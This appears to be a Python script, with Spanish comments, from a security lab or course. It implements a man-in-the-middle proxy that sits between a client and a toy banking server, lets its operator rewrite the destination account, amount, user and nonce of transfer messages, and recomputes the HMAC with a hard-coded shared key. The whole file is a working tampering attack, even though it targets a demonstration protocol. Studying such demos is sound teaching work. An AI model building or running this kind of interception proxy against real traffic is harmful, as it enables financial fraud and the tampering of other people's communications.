import socket
import hmac
from threading import Thread
from rich import print

SERVER_HOST = '172.20.10.3'  # IP del servidor real
SERVER_PORT = 8000

MITM_HOST = '127.0.0.1'  # Donde escucha pepe maligno
MITM_PORT = 9000

SHARED_KEY = b"clave_segura_para_mac_2025"

def calcular_mac(mensaje: str) -> str:
    return hmac.new(SHARED_KEY, mensaje.encode(), "sha256").hexdigest()

def forward(source, destination, is_client_to_server):
    while True:
        try:
            data = source.recv(4096)
            if not data:
                destination.shutdown(socket.SHUT_WR)
                break
            mensaje = data.decode()
            print(f"[bold yellow]Interceptado:[/bold yellow] {mensaje}")

            if is_client_to_server:
                if mensaje.startswith("4,"):
                    modificar = input("¿Quieres modificar los campos de esta transacción? (s/n):").lower()
                    if modificar == "s":
                        campos = mensaje.split(',')
                        print(f"Campos actuales:\n1. [yellow]Usuario origen:[/yellow] {campos[1]}\n2. [yellow]Cuenta destino:[/yellow] {campos[2]}\n3. [yellow]Cantidad:[/yellow] {campos[3]}")
                        nueva_cuenta = input("Nueva cuenta destino (enter para no cambiar): ").strip()
                        if nueva_cuenta:
                            campos[2] = nueva_cuenta
                        nueva_cantidad = input("Nueva cantidad (enter para no cambiar): ").strip()
                        if nueva_cantidad:
                            campos[3] = nueva_cantidad
                        mensaje = ",".join(campos)
                        print(f"[bold green]Mensaje modificado a:[/bold green] {mensaje}")
                elif mensaje.startswith("4s,"):
                    modificar = input("¿Quieres modificar los campos de esta transacción segura? (s/n):").lower()
                    if modificar == "s":
                        campos = mensaje.split(',')
                        # La estructura: 4s,usuario,cuenta,cantidad,nonce,mac
                        print(f"Campos actuales:\n1. [yellow]Usuario origen:[/yellow] {campos[1]}\n2. [yellow]Cuenta destino:[/yellow] {campos[2]}\n3. [yellow]Cantidad:[/yellow] {campos[3]}\n4. [yellow]Nonce:[/yellow] {campos[4]}\n5. [yellow]MAC:[/yellow] {campos[5]}")
                        nuevo_usuario = input("Nuevo usuario origen (enter para no cambiar): ").strip()
                        if nuevo_usuario:
                            campos[1] = nuevo_usuario
                        nueva_cuenta = input("Nueva cuenta destino (enter para no cambiar): ").strip()
                        if nueva_cuenta:
                            campos[2] = nueva_cuenta
                        nueva_cantidad = input("Nueva cantidad (enter para no cambiar): ").strip()
                        if nueva_cantidad:
                            campos[3] = nueva_cantidad
                        nuevo_nonce = input("Nuevo nonce (enter para no cambiar): ").strip()
                        if nuevo_nonce:
                            campos[4] = nuevo_nonce
                        # Recalcular el MAC con los campos actualizados excepto el MAC mismo
                        mensaje_sin_mac = ",".join(campos[:5])
                        nuevo_mac = calcular_mac(mensaje_sin_mac)
                        campos[5] = nuevo_mac
                        mensaje = ",".join(campos)
                        print(f"[bold green]Mensaje modificado y MAC recalculada a:[/bold green] {mensaje}")

            destination.sendall(mensaje.encode())

        except Exception as e:
            print(f"[bold red]Error:[/bold red] {e}")
            break

def handle_client(client_socket):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((SERVER_HOST, SERVER_PORT))
    t1 = Thread(target=forward, args=(client_socket, server_socket, True))
    t2 = Thread(target=forward, args=(server_socket, client_socket, False))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_socket.close()
    server_socket.close()

def main():
    mitm_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_server.bind((MITM_HOST, MITM_PORT))
    mitm_server.listen(5)
    print(f"[bold cyan]Usuario maligno escuchando en {MITM_HOST}:{MITM_PORT}[/bold cyan]")
    while True:
        client_sock, addr = mitm_server.accept()
        print(f"[bold blue]Cliente conectado desde {addr}[/bold blue]")
        Thread(target=handle_client, args=(client_sock,)).start()

if __name__ == "__main__":
    main()
